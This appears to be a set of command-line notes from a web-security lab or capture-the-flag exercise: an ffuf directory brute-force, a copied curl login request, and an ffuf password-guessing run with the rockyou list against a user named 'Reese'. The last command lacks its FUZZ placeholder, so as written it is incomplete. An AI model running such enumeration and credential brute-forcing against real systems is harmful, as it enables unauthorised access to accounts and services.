

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.254.37:53988/FUZZ -fr "Error 404"
```

```bash
curl 'http://83.136.251.170:39022/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://83.136.251.170:39022' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.170:39022/login?message=Authentication%20failed' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' --data-raw ''
```

```bash
ffuf -w /usr/share/seclists/rockyou.txt -u http://83.136.251.170:39022/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=Reese&password=test" -fr "Authentication failed"
```